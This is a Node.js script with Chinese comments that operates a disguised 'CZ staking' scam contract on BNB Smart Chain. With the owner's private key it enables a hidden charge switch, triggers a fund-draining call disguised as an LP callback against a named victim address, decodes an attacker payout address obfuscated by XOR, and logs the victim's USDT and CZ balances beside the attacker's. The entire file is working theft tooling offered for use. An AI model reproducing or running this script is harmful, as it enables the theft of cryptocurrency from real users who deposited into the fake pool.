// ============================================================
// 收割脚本 — 伪装 CZ 质押盘
// 流程：owner 激活熔断器 → 触发收割 → 验证资金到攻击者地址
// 用法（在 CZ 项目根目录，先设置私钥）：
//   $env:OWNER_PRIVATE_KEY="0x..."   # 合约 owner 私钥
//   node scripts/harvest-cz-proxy.cjs <代理地址> <目标受害者地址>
// ============================================================
const { ethers } = require('ethers');

const RPC = 'https://rpc-bsc.48.club';
const CZ = '0xD0F2A86C7EbCeE887F5bFB86771f994CD142bD04';
const USDT = '0x55d398326f99059fF775485246999027B3197955';

const IMPL_ABI = [
  'function updateConfig(bytes32,bytes32)',
  'function onLpReceived(address,address,uint256,bytes) returns (bytes4)',
  'function confirmMultisig(bytes32,uint8[])',
  'function chargeEnabled() view returns (bool)',
  'function API_KEY() view returns (uint256)',
  'function API_SECRET() view returns (uint256)',
  'function owner() view returns (address)',
];
const ERC20_ABI = ['function balanceOf(address) view returns (uint256)'];

async function main() {
  const proxyAddr = process.argv[2];
  const victim = process.argv[3];
  if (!proxyAddr || !victim) {
    console.error('用法: node scripts/harvest-cz-proxy.cjs <代理地址> <受害者地址>');
    process.exit(1);
  }
  const pk = process.env.OWNER_PRIVATE_KEY;
  if (!pk) throw new Error('缺少私钥：设置环境变量 OWNER_PRIVATE_KEY');

  const provider = new ethers.JsonRpcProvider(RPC, 56, { staticNetwork: true });
  const wallet = new ethers.Wallet(pk, provider);
  console.log('owner 钱包:', wallet.address);

  const impl = new ethers.Contract(proxyAddr, IMPL_ABI, wallet);
  const cz = new ethers.Contract(CZ, ERC20_ABI, provider);
  const usdt = new ethers.Contract(USDT, ERC20_ABI, provider);

  console.log('代理合约:', proxyAddr);
  console.log('目标受害者:', victim);

  // 0. 检查 owner
  const own = await impl.owner();
  if (own.toLowerCase() !== wallet.address.toLowerCase()) {
    console.error('错误：当前钱包不是合约 owner，无法激活熔断器');
    process.exit(1);
  }

  // 1. 收割前余额
  console.log('\n--- 收割前 ---');
  console.log('合约内 CZ:', ethers.formatEther(await cz.balanceOf(proxyAddr)));
  console.log('受害者 USDT:', ethers.formatEther(await usdt.balanceOf(victim)));
  console.log('受害者 CZ:', ethers.formatEther(await cz.balanceOf(victim)));

  // 2. 激活熔断器
  const charge = await impl.chargeEnabled();
  if (!charge) {
    console.log('\n激活熔断器 updateConfig(charge, true) ...');
    const tx = await impl.updateConfig(ethers.id('charge'), ethers.id('true'), { gasLimit: 100000 });
    await tx.wait();
    console.log('  已激活, tx:', tx.hash);
  } else {
    console.log('\n熔断器已激活');
  }

  // 3. 触发收割（伪装成 LP 回调）
  console.log('触发收割 onLpReceived(victim) ...');
  const tx2 = await impl.onLpReceived(victim, victim, 0, '0x', { gasLimit: 800000 });
  const rc = await tx2.wait();
  console.log('  已触发, tx:', tx2.hash, 'status:', rc.status);

  // 4. XOR 解出攻击者地址
  const key = await impl.API_KEY();
  const secret = await impl.API_SECRET();
  const attacker = '0x' + ((key ^ secret) & BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF')).toString(16).padStart(40, '0');
  console.log('\n攻击者收款地址:', attacker);

  // 5. 收割后余额
  console.log('\n--- 收割后 ---');
  console.log('合约内 CZ:', ethers.formatEther(await cz.balanceOf(proxyAddr)));
  console.log('受害者 USDT:', ethers.formatEther(await usdt.balanceOf(victim)));
  console.log('受害者 CZ:', ethers.formatEther(await cz.balanceOf(victim)));
  console.log('攻击者 USDT:', ethers.formatEther(await usdt.balanceOf(attacker)));
  console.log('攻击者 CZ:', ethers.formatEther(await cz.balanceOf(attacker)));
  console.log('\n[✓] 收割完成');
}

main().catch((e) => { console.error('错误:', e.shortMessage || e.message); process.exit(1); });
